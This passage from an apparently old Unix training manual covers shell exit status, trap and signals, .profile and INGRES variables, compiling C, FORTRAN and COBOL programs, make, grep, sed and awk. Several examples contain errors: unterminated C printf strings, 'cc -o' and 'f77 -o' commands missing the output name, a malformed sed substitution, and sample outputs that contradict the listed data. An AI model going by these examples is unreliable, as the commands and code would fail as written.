    $request id is mt_600-2736 (standard input)                
                                                               
    $                                                          

If the background task sends output to standard output and you fail to 
redirect it, the output will appear on your terminal even if you are running another program at the time. 

It is necessary to use the kill command to stop a process that is running 
in background the (DEL) key or its equivalent will not work.

Exit Status

When a process stops executing for any reason, it will return an exit 
status to the parent process. This exit status is also referred to as a 
condition code or return code.The Shell stores the exit status in a 
Shell variable called $?. By convention, a non-zero exit status means 
that it has a false value and the command failed. On the other hand, a 
zero status indicates true and the command was successful.

It is possible for you to specify the exit status when you exit a script. 
This is done by specifying the number to be used as the exit status 
using the exit command. The following script is an example:
Sample Session:

    $cat exit_example                                          
    echo 'This program returns an exit status'                 
    echo 'of 7.'                                               
    exit 7                                                     
    $exit_example                                              
    This program returns an exit status                        
    of 7.                                                      
    $echo $?                                                   
    7                                                          
    $echo $?                                                   
    0                                                          
    $                                                          
                                                               

This script will display the message and then exit with an exit code of 7. 
The exit status is stored in the Shell variable called $?. The second echo 
command above displays the exit status of the first echo command. Since it completed successfully it has a value of zero.

1.4  Interrupt Handling

A signal is a report to a process about a condition.  UNIX uses these 
signals to report bad system calls, broken pipes, illegal instructions, 
and other conditions.  There are three signals that are useful when 
programming in the Shell.  They are the terminal interrupt signal 
(number 2), the kill signal (number 9) and the software termination 
signal (number 15).

You can use the trap command to capture a signal and then take whatever action you specify.  It can close files or finish other processing that needs to be done, display a message, terminate execution immediately, or ignore the signal.

   Command Format: trap ['commands'] signal_numbers            
   See online man pages for details                            

The signal_numbers are the numbers corresponding to the signals that 
will be trapped by the trap command.  There must be at least one number present.  The 'commands' portion of the command is optional.  If it is not present, the command resets the trap to its initial condition, which is to exit the program.  When the commands is present the Shell executes the commands when it catches one of the signals.  After executing the commands, the Shell continues executing the script where it left off.

You can interrupt a program you are running in the foreground by pressing the Delete key.  When you press this key a signal (number 2), a terminal interrupt, to the program.  The Shell will terminate the execution of the program if the program does not trap the signal.  The following example demonstrates the trap command that will trap the signal and return an exit status of 1.

Sample session:

    $cat inter                                                 
    trap 'echo PROGRAM INTERRUPTED; exit 1' 2                  
    while (true)                                               
          do                                                   
          echo 'Program running'                               
          done                                                 
    $                                                          

The first line of inter sets up a trap for signal number 2, the terminal interrupt.  When the signal is caught, the Shell will execute the commands between the two single quote marks.  In this example, the echo command will display PROGRAM INTERRUPTED.  The exit command will then return control to the Shell and a system prompt is displayed.  If the exit were missing, control would revert to the while loop after displaying the message.

You can send a software termination to a background process using the kill command without a signal number.  However, a trap command can be set to catch this signal (number 15).  A kill signal can be sent to kill a process with a signal number 9 and the Shell cannot catch a kill signal.

The file called .profile

The Bourne Shell declares and initializes variables that determine such things as your home directory, what directories the Shell will look in when you give commands, how often to look for mail, your system prompt, and many other things.  We will look at some of these Shell variables and their functions.  You can assign new values to these variables from the command line or by executing the contents of a file called .profile.  The Bourne Shell executes the commands in this file in the same environment as the Shell each time the user logs in.  The .profile must be in the user' home directory.  Each user has a different .profile.  It usually specifies the terminal type and establishes terminal characteristics and other housekeeping functions as required by the user.

1.5  HOME

The first Bourne Shell variable that we will look at is the HOME variable.  By default, the home directory is the current working directory after you login.  The system administrator determines your home directory when you establish an account and places that information in the /etc/passwd file.  When you login, the BourneShell gets that pathname and assigns it to the HOME variable.

When you enter a cd command with no argument, the utility takes the name of the directory from the HOME variable and makes it the current working directory.  If you change the HOME variable to another directory pathname, the utility will make the new directory the current working directory.

Sample Session:

 $echo $HOME                                                   
 /user0/rharding                                               
 $cd                                                           
 $pwd                                                          
 /user0/rharding                                               
 $HOME=/user0/rharding/eng                                     
 $cd                                                           
 $pwd                                                          
 /user0/rharding/eng                                           
 $                                                             

This example shows how the value of the HOME variable affects the cd utility.  The cd command will use the value of the HOME variable as the pathname for the current working directory.

1.6  PATH

This BourneShell variable will describe the directories that will be searched looking for the program that you want to execute.  The BourneShell looks in several directories for a file that has the same name as the command that you entered.  The PATH variable controls this search path.  Normally, the first directory searched is the current working directory.  If the program is not found, the search continues in the /bin and then the /usr/bin directory.  Generally, these directories contain executable  programs.  If the program is not found in one of these directories, the BourneShell reports that the program can't be found (or executed).

The PATH variable lists the pathnames in the order in which the search will proceed.  The pathnames are separated by a colon (:).  If nothing (null string) precedes the colon, that indicates to start the search at the current working directory.
Example:
.................................................................
. $PATH=:/user0/rharding/bin:/bin:/usr/bin                      .
. $                                                             .
.................................................................

This PATH variable indicates to start the search for the program at the current working directory, then look in the directory /user0/rharding/bin, then /bin, and finally /usr/bin.

If each user has a unique path specified, each user can execute a different program by giving the same command.  The search for the program stops when it is satisfied; thus, you can use the same name for your own programs as the standard UNIX utilities.  To do this, simply put your program in one of the first directories that the BourneShell searches.

1.7  INGRES Environment Variables

There are some environment variables that need to be in the .profile that set up INGRES.  The following examples are given as general guidelines, not actual entries to be made in your .profile.

1.8  ING_HOME

This is the INGRES home directory. This variable is valid for version 5 of INGRES. This variable is set up in the following manner.

Example:
.................................................................
.    $ING_HOME=/user5/ingres                                    .
.................................................................

Notice that this environment variable is all capital letters. This is a requirement in UNIX.
 
1.9  TERM_INGRES

If this variable is not set, INGRES will use the default terminal  type defined by the TERM variable in UNIX.  It is not required but difficulty in using the main INGRES menu can be experienced if it is not used.

Example:
.................................................................
.    $TERM_INGRES=vt100f                                        .
.................................................................

1.10  ING_EDIT

This variable defines the editor to use any time a user enters a command that requires the use of an editor.  The default is to use the 'ed'  editor. 

Example:
.................................................................
.   $ING_EDIT=/usr/bin/vi                                       .
.................................................................

2. COMPILING "C" PROGRAMS

This chapter will examine compiling source code programs in three high level languages "C", FORTRAN, and COBOL.  The second part of the chapter will look at the archive and library maintainer.  The archive allows you to create a library of object modules.  These files are used by the link editor.

2.1  "C": Sample Program with a Main and Two Functions in One File

Based on the command line options, cc compiles, assembles, and loads C language source code programs.  It can also assemble and load assembly language source programs or merely load object programs.

  Command Format:  cc [options] file-list                      
  (See Appendix E for a complete list of options)              

When using the cc utility, the following conventions are observed:

       1.     A filename with the extension of .c indicates a C language source program.

       2.     A filename with an extension of .s indicates an assembly language source program.

       3.     A filename with an extension of .o indicates an object program.

The cc utility will take its input from the file or files you specify on the command line.  Unless you use the -o option, it will store the executable program in a file called a.out. 


Sample C Language Source Code Program:
                           
 $cat hello.c                                                  
 main ()                                                       
 {                                                             
      printf ("Hello from main!\n\n");                         
      printf ("Calling function1!\n\n");                       
      funct1();                                                
      printf ("\t Back from function1!\n\n");                  
      printf ("Calling function2!\n\n");                       
      funct2();                                                
      printf ("\t Back from funct2!\n\n");                     
      printf ("That's all!\n\n");                              
 }                                                             
 funct1()                                                      
 {                                                             
      printf ("\t\t Hello from function1!\n\n);                
 }                                                             
 funct2()                                                      
 {                                                             
      printf ("\t\t Hello from function2!\n\n);                
 }                                                             

2.2  "C": Compiling a Program

To compile the previous example program into an executable module, enter the following command at the command line.

Sample Session:

 $cc hello.c                                                   
 $                                                             

Without any options, cc accepts C source code and assembly language programs that follow the conventions outlined above.  It will compile, assemble, and load these programs to produce an executable called a.out.  The cc utility puts the object code in files with the same base filename (everything before the period) as the source but with a filename extension of .o.  The a.out stands for assembly output.  This is the default.

Sample Session:

 $cc hello.c                                                   
 $a.out                                                        
 Hello from main!                                              
 Calling function1!                                            
                Hello from function1!                          
           Back from function1!                                
 Calling function2!                                            
                Hello from function2!                          
           Back from function2!                                
 That's all!                                                   
 $                                                             

NOTE:         The a.out file that was created by the cc utility has the following permissions:
	              	user  - read, write, and execute 
           	   	group - read and execute
              		other - read and execute

It is not necessary for you to change the permissions using the chmod command because the cc utility set the execute permissions for you.

2.3  "C": Renaming the Executable Module

You can rename the executable module using the mv command.  The file permissions will be the same as before the file is renamed.

Sample Session:

 $mv a.out hello                                               
 $hello                                                        
 Hello from main!                                              
 Calling function1!                                            
                Hello from function1!                          
           Back from function1!                                
 Calling function2!                                            
                Hello from function2!                          
           Back from function2!                                
 That's all!                                                   
 $                                                             

2.4  "C": Giving a Name to the Output File

It is possible to have the output sent to a file you specify instead of a.out by using the following command.


  Command Format:  cc -o output source                         
                                                               
  output - the name of the executable file                     
                                                               
  source - the name of the C source code file                  
                                                               
The -o option tells cc to tell the link editor to use the specified name for the output instead of the default a.out.

NOTE:         It is not necessary for the -o option to appear after the cc command.  The filename that appears after the -o is the name of the output file.  For example, cc source -o output is the same as cc -o output source.

Sample Session:

 $cc -o hello.c                                                
 $hello                                                        
 Hello from main!                                              
 Calling function1!                                            
                Hello from function1!                          
           Back from function1!                                
 Calling function2!                                            
                Hello from function2!                          
           Back from function2!                                
 That's all!                                                   
 $                                                             

2.5  "C": Producing an Assembly Listing

This option causes cc to compile C programs and leave the corresponding assembly language source programs in a file with filename extensions of .s.

  Command Format:  cc -S hello.c                               
                                                               
  -S = Compile only                                            

Sample Session:

 $cc -S  hello.c                                               
 $ls -C                                                        
 example.f    hello     hex.c     octal.c                      
 hello.c      hello.s   multiply.c                             
 $                                                             
2.6  "C": Main and Two Functions in Three Separate Source Files

This is the same C program that we have seen before, except it is now in three files rather than one as before.  The three files are main.c, funct1.c, and funct2.c.

 $cat main.c                                                   
 main ()                                                       
 {                                                             
      printf ("Hello from main!\n\n");                         
      printf ("Calling function1!\n\n");                       
      funct1();                                                
      printf ("\t Back from function1!\n\n");                  
      printf ("Calling function2!\n\n");                       
      funct2();                                                
      printf ("\t Back from funct2!\n\n");                     
      printf ("That's all!\n\n");                              
 }                                                             
 $cat funct1.c                                                 
 funct1()                                                      
 {                                                             
      printf ("\t\t Hello from function1!\n\n);                
 }                                                             
 $cat funct2.c                                                 
 funct2()                                                      
 {                                                             
      printf ("\t\t Hello from function2!\n\n);                
 }                                                             

2.7  "C": Compiling but Not Producing an Executable Module


Using the previous program, the following command will compile but not produce an executable module.

     Command Format:     cc -c main.c funct1.c funct2.c        
                                                               
     -c = Compile, but do not load object files.  This option  
          causes cc to compile and/or assemble source code     
          programs and leave the corresponding object programs 
          in files with filename extensions of .o.             

Sample Session:

 $cc -c main.c funct1.c funct2.c                               
 main.c:                                                       
 funct1.c:                                                     
 funct2.c:                                                     
 $ls a.out                                                     
 a.out not found                                               
 $ls -C *.o                                                    
 funct1.o           funct2.o          main.o                   
 $                                                             

The -c options causes the compilation system to suppress the link edit phase.  This produces an object file or files, in this example (main.o funct1.o funct2.o), that can be link edited at a
later time with the cc command with no options. 

3.  COMPILING FORTRAN  PROGRAMS

3.1  FORTRAN: Sample Program a Main and Two Subroutines

There are several conventions for use with the FORTRAN compiler.
They are:

       1.     The name of the file containing the FORTRAN source code must end with .f.

       2.     The compiler is invoked with f77.

       3.     Several options are available with the compiler. (-c, -o, -p, -S)

       4.     Preconnections are made for stdin (unit5) and stdout (unit6).

This is the FORTRAN source code example to be used in the following discussions of the FORTRAN compiler.

Sample Session:

 $cat hello.f                                                  
       program calling                                         
       write(6,100)                                            
 100   format (' Hello from main!',/)                          
       write(6,110)                                            
 110   format(' Calling subroutine1!',/)                       
       call sub1                                               
       write(6,120)                                            
 120   format(t15' Back from subroutine1!',/)                  
       write(6,130)                                            
 130   format(' Calling subroutine2!',/)                       
       call sub2                                               
       write(6,140)                                            
 140   format(t15' Back from subroutine2!',/)                  
       write(6,150)                                            
 150   format(' That's all, folks!')                           
       end                                                     
       subroutine sub1                                         
       write(6,200)                                            
 200   format(t20,' Hello from subroutine1!',/)                
       end                                                     
       subroutine sub2                                         
       write(6,210)                                            
 210   format(t20,' Hello from subroutine2!',/)                
       end                                                     

3.2  FORTRAN: Compiling a Program

The FORTRAN compiler is invoked with the following command:

  Command Format:  f77                                         

To compile the above program into an executable program, use the following command at the command line.

Sample Session:

 $f77 hello.f                                                  
 $                                                             

Without any options, f77 accepts FORTRAN source code and assembly language programs that follow the conventions outlined above.  It will compile, assemble, and load these programs to produce an executable called a.out.  The f77 utility outputs the object code
into files with the same base filename (everything before the period) as the source but with a filename extension of .o. The a.out stands for assembly output.  This is the default.

Sample Session:

 $f77 hello.f                                                  
 $a.out                                                        
 Hello from main!                                              
 Calling function1!                                            
              Hello from function1!                            
         Back from function1!                                  
 Calling function2!                                            
              Hello from function2!                            
         Back from function2!                                  
 That's all!                                                   
 $                                                             

NOTE:         The a.out file that was created by the f77 utility has the following permissions:
              		user - read, write, and execute 
              		group - read and execute
              		other - read and execute

It is not necessary for you to change the permissions using the chmod command because the f77 utility set the execute permissions for you.

3.3  FORTRAN: Renaming the Executable Module

You can rename the executable module using the mv command.  The file permissions will be the same as before the file is renamed.

Sample Session:

 $mv a.out hello                                               
 $hello                                                        
 Hello from main!                                              
 Calling function1!                                            
              Hello from function1!                            
         Back from function1!                                  
 Calling function2!                                            
              Hello from function2!                            
         Back from function2!                                  
 That's all!                                                   
 $                                                             

3.4  FORTRAN: Giving a Name to the Output File

It is possible to have the output sent to a file you specify instead of the default, a.out, by using the following command.

  Command Format:  f77 -o output source                        
                                                               
  output - the name of the executable file                     
                                                               
  source - the name of the Fortran source code file            
                                                               
The -o option tells the f77 utility to tell the link editor to use the specified name for the output instead of the default a.out.

NOTE:         It is not necessary for the -o option to appear after the f77 command.  The filename that appears after the - o is the name of the output file.  For example, f77 source -o output is the same as f77 -o output source.

Sample Session:

 $f77 -o hello.f                                               
 $hello                                                        
 Hello from main!                                              
 Calling function1!                                            
              Hello from function1!                            
         Back from function1!                                  
 Calling function2!                                            
              Hello from function2!                            
         Back from function2!                                  
 That's all!                                                   
 $                                                             

3.5  FORTRAN: Producing an Assembly Listing

This option causes f77 to compile Fortran programs and leave the corresponding assembly language source programs in a file with filename extensions of .s.

  Command Format:  f77 -S hello.f                              
                                                               
  -S = Compile only                                            

Sample Session:

 $f77 -S  hello.f                                              
 $ls -C                                                        
 example.f         hello     hex.c     octal.c                 
 hello.c           hello.s   multiply.c                        
 $                                                             

The file hello.s contains the assembly listing.

3.6  FORTRAN: Main and Two Subroutines in Three Separate Source Files

Sample Session:

 $cat main.f                                                   
      program calling                                          
      write(6,100)                                             
 100  format (' Hello from main!',/)                           
      write(6,110)                                             
 110  format(' Calling subroutine1!',/)                        
      call sub1                                                
      write(6,120)                                             
 120  format(t15' Back from subroutine1!',/)                   
      write(6,130)                                             
 130  format(' Calling subroutine2!',/)                        
      call sub2                                                
      write(6,140)                                             
 140  format(t15' Back from subroutine2!',/)                   
      write(6,150)                                             
 150  format(' That's all, folks!')                            
      end                                                      
 $cat sub1.f                                                   
      subroutine sub1                                          
      write(6,200)                                             
 200  format(t20,' Hello from subroutine1!',/)                 
      end                                                      
 $cat sub2.f                                                   
      subroutine sub2                                          
      write(6,210)                                             
 210  format(t20,' Hello from subroutine2!',/)                 
      end                                                      

3.7  FORTRAN: Compiling But Not Producing an Executable Module

Using the above program, the following command will compile but not produce an  executable module.

  Command Format:  f77 -c main.f sub1.f sub2.f                 
                                                               
  -c = Compile, but do not load object files.  This option     
       causes f77 to compile and/or assemble source code       
       programs and leave the corresponding object programs    
       in files with filename extensions of .o.                

Sample Session:

 $f77 -c main.f sub1.f sub2.f                                  
 main.f:                                                       
      MAIN: calling:                                           
 sub1.f:                                                       
      sub1:                                                    
 sub2.f:                                                       
      sub2:                                                    
 $ls a.out *.o                                                 
 a.out not found                                               
 funct1.o                                                      
 funct2.o                                                      
 hello.o                                                       
 main.o                                                        
 sub1.o                                                        
 sub2.o                                                        
 $                                                             

The -c options causes the compilation system to suppress the link edit phase.  This produces an object file or files, in this example (main.o sub1.o sub2.o), that can be link edited at a later time with the f77 command with no options. 

3.8  FORTRAN: Compiling Object Files to Produce an Executable Module

The command to produce an executable nodule from several object files is done in the following manner:

  Command Format:  f77 obj_1 obj_2 obj_3                       
                                                               
  obj_1 through obj_n - the object files                       
Sample Session:

 $f77 main.o sub1.o sub2.o                                     
 $ls -C                                                        
 funct1.o funct2.o hello.o main.o sub1.o sub2.o a.out          
 $                                                             

4.  COMPILING COBOL PROGRAMS

4.1  COBOL: Sample Program with a Main and Two Subroutines

Sample Session:

 $cat teacher.cob                                              
 identification division.                                      
 program-id. teacher.                                          
 environment division.                                         
 configuration section.                                        
 data division.                                                
 working-storage section.                                      
 procedure division.                                           
 begin section.                                                
 begin-it.                                                     
      display " Hello from main!".                             
      display "  Calling subroutine1!".                        
      perform subroutine1.                                     
      display "               Back from subroutine1!".         
      display "  Calling subroutine2!".                        
      perform subroutine2.                                     
      display "               Back from subroutine2!".         
      display "  That's all, folks!".                          
      stop run.                                                
 subroutine1 section.                                          
 sub1.                                                         
      display "               Hello from subroutine1!".        
 subroutine2 section.                                          
 sub2.                                                         
      display "               Hello from subroutine2!".        

4.2  COBOL: Compiling a Program

  Command Format:  cobol source_filename                       

Three files are created by the compiler.  They are identified by the same filename as the source code but with a different extension.  They have the extensions .IDY, .INT, and .LST.

NOTE:         These extensions are uppercase characters.  UNIX is case sensitive.

Sample Session:

 $cobol teacher.cob                                            
 $ls teacher*                                                  
 teacher.IDY                                                   
 teacher.INT                                                   
 teacher.LST                                                   
 teacher.cob                                                   
 $                                                             

4.3  COBOL: Running a Program

 $cbrun teacher.INT                                            
 Hello from Main!                                              
   Calling subroutine1!                                        
               Hello from subroutine1!                         
              Back from subroutine1!                           
   Calling subroutine2!                                        
               Hello from subroutine2!                         
              Back from subroutine2!                           
 That's all, folks!                                            
 $                                                             

5.  THE make UTILITY 

The make utility is used to keep a set of executable programs current.  This is based on the modification times of the programs and the source code that each program is dependent upon.  The utility will look at the dependency lines in a file called makefile in the current working directory.  These dependency lines indicate relationships between files, specifying a target file that is dependent on one or more prerequisite files.  If you modified any of the prerequisite files more recently than the target file, make will update the target file based on
construction commands that follow the dependency lines.

    Command Format: make [options] [target_files]              
    See the online man pages for a detailed list of options    

The target_files refer to targets on dependency lines in the file called makefile. If you do not specify a target_file, make will update the first dependency line it finds in makefile.

The makefile has the following construction:

       target:   prerequisite_list
       tab       construction_commands

The dependency line is composed of target and the prerequisite_list, separated by a colon.  The construction_commands must start with a tab character and must follow the dependency line. 

The target is the name of the file that is dependent on the files in the prerequisite_list.  The construction_commands are shell commands that construct the target, these are usually compile commands.

The make utility will execute the construction_commands when the modification time  of one or more of the files in the prerequisite_list is more recent than the target.

Sample makefile:

       payroll: sales.c salary.c
              cc sales.c salary.c -o payroll

In the example, the target is called payroll. It is dependent on sales.c and salary.c.  If the modification time of either of these is more recent than payroll, the construction_commands will be executed. In this case, the source code programs are compiled and stored in payroll.

In the previous example, to get the update to occur simply type make.

Example:
.................................................................
.    $make                                                      . 
.................................................................

Since no target was specified, the first dependency line is the one that make will attempt to execute.

Each of the prerequisites on one dependency line can be a target on other dependency lines.  This nesting of specifications can continue, creating a complex hierarchy that can specify a large system of programs.


Sample makefile:

     form:  size.o length.o
             cc size.o length.o -o form
     size.o:  size.c form.h
             cc -c size.c
     length.o: length.c form.h
             cc -c length.c
     form.h:  num.h table.h
            cat num.h table.h > form.h
     
Notice that form is dependent on two object files, size.o and length.o.  These two object files are, in turn, dependent upon their respective source code programs and the header file, form.h.  The header file is dependent upon two other header files.  Note that the construction_commands for form.h can use any shell command, in this case cat creates the header file. This makefile can be quite difficult to write, especially if there are a number of interdependencies.  The make utility can rely upon implied dependencies and  construction_commands to make your job of writing the makefile easier.  If you do not include a dependency line for a file, make assumes that object program files are dependent on compiler or assembler source code files.  If a prerequisite for a target file is &lt;filename>.o and &lt;filename>.o is not a target with its own prerequisites, make will search for one of the following files in the current working directory. 

       Filename             Type of file

     &lt;filename>.c          C source code
     &lt;filename>.f          FORTRAN source code
     &lt;filename>.s          Assembler source code

If you do not include a construction_command for one of the files listed, make will create a default construction_command line that will call the appropriate compiler or assembler to create the object file.

grep: A PATTERN MATCHING FILTER

The grep utility can search through a file to see if it contains a specified string of characters.  The utility will not change the  file it searches but displays each line that contains the string.  The format for the string is as follows.
 
  Command Format:  grep [options] limited_regular-expression [file]         
                                                                            
    Use the man command for a complete list of options                      
                                                                            
The grep utility searches files for a pattern and displays all  lines that contain the pattern.  It uses limited-regular- expressions (these are expressions that have string values that use a subset of all the possible alphanumeric and special  characters) like those used with ed to match the patterns. 
 
Be careful using the characters $, *, [, ^, |, (, ), and \ in the regular expression because they will be evaluated by the Shell.  It is good practice to enclose the regular expression in single 
quotes.  This will prevent the Shell from evaluating these special characters.
 
The grep utility will assume standard input if no files are  given.  Normally, each line found in the file will be displayed  to standard output.
 
Sample session:

    $grep 'disc' memo                                          

This command will search the file "memo" for the string "disc".  It will include words like discover and indiscreet because they contain the characters "disc".  The single quote marks are not necessary, and for this example, they wouldn't have made any difference.  They do allow you to include spaces in the search pattern. 

5.0.1  More on Regular Expressions

The grep command can be best understood by a discussion of regular expressions.  Let's create a database of phone numbers called phone.lis and then use regular expressions to search through the database.  Here is as listing of the contents of phone.lis

Sample session:

    $cat phone.lis                                             
    Smith, Joan              	7-7989                            
    Adams, Fran              	2-3876                            
    StClair, Fred            	4-6122                            
    Jones, Ted               	1-3745                            
    Stair, Rich              	5-5972                            
    Benson, Sam              	4-5587                            
    $                                                          


The format for the records in this database is:
                                             
       Last name, First name &lt;tab>   #-####

Using the database (phone.lis) above.  What grep command would we use to search through the database and get all the records that had a person whose name contains an "S".

An alphabetic character represents itself.

Sample session:

    $grep S phone.lis                                          
    Smith, Joan              	7-7989                            
    StClair, Fred            	4-6122                            
    Stair, Rich              	5-5972                            
    Benson, Sam              	4-5587                            
    $                                                          

This grep command searched for the string "S" and then listed all the lines in phone.lis that matched. A single . (dot) is used to represent any single character.

Sample session:

    $grep .S phone.lis                                         
    Benson, Sam         	4-5587                                 
    $                                                          

A $ represents the end of the line.

Sample session:

    $grep 5$ phone.lis                                         
    Jones, Ted         	1-3745                                  
    $                                                          

A ^ represents the beginning of the line

Sample session:

    $grep ^S phone.lis                                         
    Smith, Joan         	7-7989                                 
    StClair, Fred       	4-6122                                 
    Stair, Rich         		5-5972                                 
    $                                                          

Regular expressions must get to grep in order for them to be evaluated properly.  Let's say we want to get the records of employees that have a phone number that begins with a "4".
What does the following expression do?

Sample session:

    $grep &lt;tab>4 phone.lis                                     
    StClair, Fred        	4-6122                                
    Jones, Ted           	1-3745                                
    Benson, Sam          	4-5587                                
    $                                                          

Why did we get the record of Ted Jones?  The tab character was  evaluated by the Shell and so the search was actually made looking for a "4".  This is the same as if we had entered $grep 4  phone.lis.  We must prevent the Shell from evaluating these characters, this is done with the \ (backslash) character as shown in the next example.

Sample session:

    $grep \&lt;tab>4 phone.lis                                    
    StClair, Fred                	4-6122                        
    Benson, Sam                  	4-5587                        
    $                                                          

Now it worked properly.  It searched for a &lt;tab> character followed by the number 4.  The [] (left and right brackets) are used to identify a range of characters.

Sample session:

    $grep \[AF] phone.lis                                      
    Adams, Fran             	2-3876                             
    StClair, Fred           	4-6122                             
    $                                                          
 
Why do [] need to be quoted?  In the previous example the search makes a match on "A" or "F". 

A - (dash) can indicate inclusion.  For example, we want to make a match on a phone number that has a 1, 2, 3, or 4.  How can this be done?  Here's an example:

Sample Session:

    $grep \[1-4] phone.lis                                     
    Adams, Fran                	2-3876                          
    StClair, Fred              	4-6122                          
    Jones, Ted                 	1-3745                          
    Stair, Rich                	5-5972                          
    Benson, Sam                	4-5587                          
    $                                                          

A ^ character looks for all characters NOT inside the [ ] brackets. 

For example,

       [^0-9]        matches all non-digits

       [^a-zA-Z]     matches all non-alphabetic characters

       NOTE:         \, *, and $ lose their metacharacter meanings inside the [ ].  Also the ^ character is special only if it appears first.

What is the following command searching for?

Sample Session:

    $grep '[^789]$' phone.lis                                  
    Adams, Fran                  	2-3876                        
    StClair, Fred                	4-6122                        
    Jones, Ted                   	1-3745                        
    Stair, Rich                  	5-5972                        
    $                                                          
                                                                 
5.0.2  Still More Regular Expressions

The * (asterisk) represents zero or more of the characters preceding the asterisk.

       A*            represents 0 or more As.

       AA*           represents 1 or more As.

       [0-9]*$       0 or more digits at the end of a line 
                     (last four digits in a phone number)
       .*            represents 0 or more of any character.
How would you write a grep command using regular expressions to find the last name starting with an "S" and the first name with an "F"?

       ^S            Begins with an "S"

       .*,F          Any number of characters before ,F

Sample session:

    $grep ^S.\*,F phone.lis                                    
    StClair, Fred     4-6122                                   
    $                                                          
                                                                 
NOTE:         The * (asterisk) was quoted so the Shell didn't try to evaluate it.

It is very desirable to quote the entire string to keep the Shell from doing an expansion or substitution.  It also increases readability of the regular expression as in the following example.

Sample session:

    $grep '^S.*, F' phone.lis                                  
    StClair, Fred     4-6122                                   
    $                                                          

5.0.3  Some Nice grep Options             

The grep provides several options that modify how the search is
performed.

       -c     Report count of matching lines only

       -v     Print those lines that don't match the pattern.

What will these lines print?

Sample session:

     $grep -c '[J-Z]' phone.lis                                
     5                                                         
     $                                                         


Why did we get this result?  Let's analyze the command.  In English, this command could be interpreted to mean "Tell me how many records in the file "phone.lis" contain a letter from the set J through and including Z."  Look at the phone.lis file and see that five records fit this restriction.  So the answer is 5.

Now look at another example and see what this one does.

Sample session:

    $grep -v '[J-Z]' phone.lis                                 
    Adams,Fran        2-3876                                   
    $                                                          

Why is this the only record that was found?  The -v option says to select records that don't match the pattern.  This is the same pattern as the previous example and therefore it selects records that don't match the pattern.  The "Adams" record is the only one that doesn't make a match.  It doesn't have a character from the set J through and Z. 

5.0.4  Summary of Regular Expression Characters

       ^             Beginning of the line

       $             End of the line

       *             0 or more preceding characters

       .             Any single character

       [...]         A range of characters

       [^...]        Exclusion range of characters
 
sed: EDIT A FILE TO STANDARD OUTPUT

UNIX provides a method of editing streams of data.  It is the sed utility.  The name of this utility is derived from Stream EDitor. This is not the same as the vi editor.  The vi editor edits text in a file.  The sed utility edits text in a stream.  In order to edit a character stream two things are required.  First, the line to edit must be identified (regular expressions) and second, how to edit the line.

    Command Format: sed [-n] [-e script] [-f sfile] [files]    
    Details in on-line man pages                               

The sed utility copies the named files (standard input default) to the standard output, edited according to a set (script) of commands.  The -f options cause the script to be taken from file
"sfile".

The general form is:

       $sed /address/instruction

NOTE:         If no address is specified, all lines are chosen to edit.  'sed' addresses can be line numbers or regular expressions.

Example:
 
       line numbers                2,4
                                   2,$    ($ represents the last line)

       textual address             /regular-expression/

NOTE:         Forward slashes enclose textual addresses

The sed instructions indicate what editing function to perform.  Here some useful sed instructions:

       s             substitute

       d             delete

NOTE:         Most sed command lines contain spaces or metacharacters and they should be quoted to protect them from the Shell.  There are many more editing commands provided by sed.  The following is a sample sed command to edit the records in the database file that we are already familiar with; namely, phone.lis.

Sample session:

    $sed /s/Smith/Smythe/ phone.lis                            
    Smythe, Joan        7-7989                                 
    Adams, Fran         2-3876                                 
    StClair, Fred       4-6122                                 
    Jones, Ted          1-3745                                 
    Stair, Rich         5-5972                                 
    Benson, Sam         4-5587                                 
    $                                                          

sed is an editor.  It simply copies the standard input to the standard output, editing the lines that match the indicated address.  The original file is not changed. 

Here's another example of a sed command.

Sample session:

    $sed '2,4 s/2$/3/' phone.lis                               
    Smith, Joan         7-7989                                 
    Adams, Fran         2-3876                                 
    StClair, Fred       4-6123                                 
    Jones, Ted          1-3745                                 
    Stair, Rich         5-5972                                 
    Benson, Sam         4-5587                                 
    $                                                          

What does this sed command do?  If you read command in English it reads like this: On lines 2 through 4 substitute the 2 at the end of the line with a 3.  Notice that the phone number for StClair, Fred changed from 4-6122 to 4-6123.  The number for Stair, Rich didn't change because it was outside the range.

The sed utility can also be use to delete parts of a line of data.  This is done by substituting nothing for the parts you want to delete.  It looks like this:

Sample session:

    $sed 's/^.*, //' phone.lis                                 
    Joan               7-7989                                  
    Fran               2-3876                                  
    Fred               4-6122                                  
    Ted                1-3745                                  
    Rich               5-5972                                  
    Sam                4-5587                                  
    $                                                          

Reading this command it means:                                   

Substitute from the beginning of the line followed by any number of characters followed by a comma with the null string (nothing).  This has the effect of removing the text.               

Here's a delete command and how it's used.

Sample session:

    $sed d phone.lis                                           
    $                                                          

Why is there no output? Well, it read standard input and did the editing function on all the selected lines.  Since no lines were specified all lines were selected to be edited.  The editing was to delete the line.

Question: Has the original file been destroyed?

Multiple commands are allowed in sed.  Each instruction is applied to each input line.

Sample session:

    $sed '/Stair/d                                             
    >/Adams/d' phone.lis                                       
    Smith, Joan         7-7989                                 
    StClair, Fred       4-6122                                 
    Jones, Ted          2-1136                                 
    Benson, Sam         4-5587                                 
    $                                                          

The records for Adams and Stair have both been removed from the database.

NOTE:         The > character is the BourneShell secondary prompt.

awk: A PATTERN MATCHING PROGRAMMING LANGUAGE

Suppose you wanted to change the format of the database phone.lis to be the first name followed by the last name.  There is no easy way to do this with sed.  Fortunately, UNIX not only provides a stream editor (sed) but it also has a formatting tool.  The formatting tool in UNIX is called awk.  This tool is named after authors who wrote it  Alfred V. Aho, Peter J. Weinberger, and Brian W. Kerninghan so it really doesn't have any meaning.

The awk utility is a pattern scanning and processing language.  It will search one or more files for a specified pattern and then performs an action, such as writing to standard output or incrementing a counter when it finds a match.  You can use awk to generate reports or filter text.  It works equally well with numbers or text.  The authors designed it to be easy to use and sacrificed execution speed toward this end.

While the sed utility allows us to change the text in a stream, awk allows us to easily rearrange, add, or delete text in a stream. The awk takes advantage of many constructs from the C programming language.  It has the following features:

       flexible format
       conditional execution
       looping statements
       numeric variables
       string variables
       regular expressions
       C's printf

The awk will take its input from the files you specify on the command line or from standard input.  The following is the format for awk:

    Command format: awk [-Fc] [prog] [files]                   

The awk will scan each line of file for lines that match a set of patterns specified by prog.  With each pattern in prog there can be an associated action to be performed when the line is found.  The set of patterns may appear literally as prog, or in a file specified as -f file.  The prog string should be enclosed in single quotes to protect it from the Shell.

Files are read in order and if there are none specified the standard input is read.  Each line is matched against the pattern portion of every pattern-action statement.  The associated action
is performed for each matched pattern.  An input line is made up fields separated by white space.  $1, $2.. define the fields.  $0 refers to the whole line.

A pattern-action statement has the form:

       pattern {action}

A missing action means print the line; a missing pattern always makes a match.  A statement can be one of the following:

       if (conditional) statement [else statement]
